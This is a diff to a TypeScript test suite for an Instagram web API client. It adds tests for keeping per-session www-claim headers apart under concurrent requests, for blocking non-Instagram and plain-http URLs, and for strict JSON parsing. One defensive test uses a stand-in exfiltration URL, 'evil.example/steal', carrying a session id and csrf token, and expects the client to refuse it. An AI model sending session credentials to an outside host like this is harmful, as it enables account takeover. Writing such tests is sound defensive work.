@@ -262,7 +262,7 @@ describe("www-claim isolation between auth modes", () => {
         await getJson("/x", { label: "anon" });
 
         expect(seen[1]["x-ig-www-claim"]).toBe("0");
-        expect(__clientTesting.currentWwwClaim("session")).toBe("hmac.SESSION");
+        expect(__clientTesting.currentWwwClaim("abc")).toBe("hmac.SESSION");
         __clientTesting.resetWwwClaim();
     });
 
@@ -284,6 +284,109 @@ describe("www-claim isolation between auth modes", () => {
         expect(seen[1]["x-ig-www-claim"]).toBe("hmac.ACCOUNT_A");
         expect(seen[2]["x-ig-www-claim"]).toBe("0");
         __clientTesting.resetWwwClaim();
+    });
+
+    test("keeps claims apart when two credentials are in flight at the same time", async () => {
+        // Sequential tests cannot catch this. With one shared slot plus an "whose
+        // claim is this?" variable, the window between B taking ownership and B
+        // building its headers is one await wide — long enough for A's response
+        // to drop A's claim into the slot that B is about to read.
+        __clientTesting.resetWwwClaim();
+        const seen: Array<Record<string, string>> = [];
+        let releaseA: () => void = () => undefined;
+        const aIsHeld = new Promise<void>((resolve) => {
+            releaseA = resolve;
+        });
+
+        globalThis.fetch = mock(async (_url: string, init?: RequestInit) => {
+            const headers = (init?.headers ?? {}) as Record<string, string>;
+            seen.push(headers);
+
+            if (headers.cookie?.includes("session-a")) {
+                await aIsHeld;
+                return new Response('{"ok":true}', { status: 200, headers: { "x-ig-set-www-claim": "hmac.A" } });
+            }
+
+            return new Response('{"ok":true}', { status: 200, headers: { "x-ig-set-www-claim": "hmac.B" } });
+        }) as unknown as typeof fetch;
+
+        // A goes out and parks inside fetch; B overtakes it and completes.
+        const a = getJson("/x", { label: "a", sessionId: "session-a" });
+        await getJson("/x", { label: "b", sessionId: "session-b" });
+
+        // Now A's response lands, writing A's claim while B was the last owner.
+        releaseA();
+        await a;
+
+        await getJson("/x", { label: "b again", sessionId: "session-b" });
+
+        // seen[0] = A (parked), seen[1] = B, seen[2] = B again.
+        expect(seen[2].cookie).toContain("session-b");
+        expect(seen[2]["x-ig-www-claim"]).toBe("hmac.B");
+        expect(__clientTesting.currentWwwClaim("session-a")).toBe("hmac.A");
+        __clientTesting.resetWwwClaim();
+    });
+});
+
+describe("request origin", () => {
+    test("refuses to send credentials to a host that is not Instagram", async () => {
+        // getJson attaches sessionid, csrftoken and the www-claim to whatever it
+        // is pointed at, so an absolute URL from a caller is an exfiltration path.
+        let requested = 0;
+        globalThis.fetch = mock(async () => {
+            requested += 1;
+            return new Response('{"ok":true}', { status: 200 });
+        }) as unknown as typeof fetch;
+
+        const error = (await getJson("https://evil.example/steal", {
+            label: "test",
+            sessionId: "abc",
+            csrfToken: "tok",
+        }).catch((err) => err)) as InstagramError;
+
+        expect(requested).toBe(0);
+        expect(error.name).toBe("InstagramError");
+        expect(error.message).toContain("not the Instagram web origin");
+    });
+
+    test("refuses plaintext http even on the right host", async () => {
+        let requested = 0;
+        globalThis.fetch = mock(async () => {
+            requested += 1;
+            return new Response('{"ok":true}', { status: 200 });
+        }) as unknown as typeof fetch;
+
+        const error = (await getJson("http://www.instagram.com/api/v1/x", { label: "test", sessionId: "abc" }).catch(
+            (err) => err
+        )) as InstagramError;
+
+        expect(requested).toBe(0);
+        expect(error.name).toBe("InstagramError");
+    });
+
+    test("still resolves ordinary relative paths against the web origin", async () => {
+        let capturedUrl = "";
+        globalThis.fetch = mock(async (url: string | URL) => {
+            capturedUrl = String(url);
+            return new Response('{"ok":true}', { status: 200 });
+        }) as unknown as typeof fetch;
+
+        await getJson("/api/v1/users/web_profile_info/?username=x", { label: "test" });
+
+        expect(capturedUrl).toBe("https://www.instagram.com/api/v1/users/web_profile_info/?username=x");
+    });
+});
+
+describe("strict JSON parsing", () => {
+    test("rejects a body with comments rather than leniently accepting it", async () => {
+        // Instagram cannot emit JSONC. A lenient parser accepting it would hide a
+        // body that is not actually from the API behind a successful parse.
+        mockResponse('{"ok": true /* not something Instagram sends */}', 200);
+
+        const error = (await getJson("/x", { label: "test" }).catch((err) => err)) as InstagramError;
+
+        expect(error.name).toBe("InstagramError");
+        expect(error.message).toContain("malformed JSON");
     });
 });
 
